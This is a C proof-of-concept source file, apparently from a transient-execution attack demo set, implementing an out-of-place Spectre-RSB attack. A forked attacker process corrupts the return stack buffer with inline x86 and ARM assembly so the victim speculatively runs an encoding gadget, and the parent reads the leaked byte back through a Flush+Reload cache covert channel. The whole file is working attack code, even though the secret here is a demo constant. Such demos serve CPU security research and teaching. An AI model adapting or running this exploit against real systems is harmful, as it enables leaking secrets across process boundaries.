#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <unistd.h>

#include "libcache/cacheutils.h"

#define SECRET 'S'

char secret;

// Put to sleep for a long period of time 
void __attribute__((noinline)) wrong_return() {
  usleep(100000);
  return;
}

// Pop the return address from the software stack, causing misspeculation
void __attribute__((noinline)) pollute_rsb() {
#if defined(__i386__) || defined(__x86_64__)
  asm volatile("pop %%rax\n" : : : "rax");
  asm("jmp return_label");
#elif defined(__aarch64__)
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
  asm("b return_label");
#endif
}

int main(int argc, char **argv) {
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
 
  pagesize = sysconf(_SC_PAGESIZE);
  char *_mem = malloc(pagesize * (256 + 4));
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  memset(mem, 0, pagesize * 256);

  // OOP attack, so fork
  pid_t is_child = fork() == 0;

  // Attacker always encodes a dot in the cache
  if(is_child)
    secret = '.';
  else
    secret = SECRET;

  // Attacker destroys the software stack return address, causing misspeculation
  if(is_child) {
    while (1) {
      // required so that we don't return from our pollute_rsb function, never popping it from the RSB
      asm("return_label:");
      pollute_rsb();
      // no real execution of this maccess, so we normally should never have cache hits
      // Victim is transiently misdirected here
		  cache_encode(secret);
      maccess(0);
    }
  } else {
    while(1) {
      // Flush shared memory
      flush_shared_memory();
      mfence();
      // Call function and transiently return to wrong location before coming back here
	  	wrong_return();

      // Recover data from covert channel
      for (int i = 0; i < 256; i++) {
        // flush and reload
        if (flush_reload(mem + i * pagesize)) {
          printf("%c   ", i);
          fflush(stdout);
        }
      }
      sched_yield();
    }
  }
}
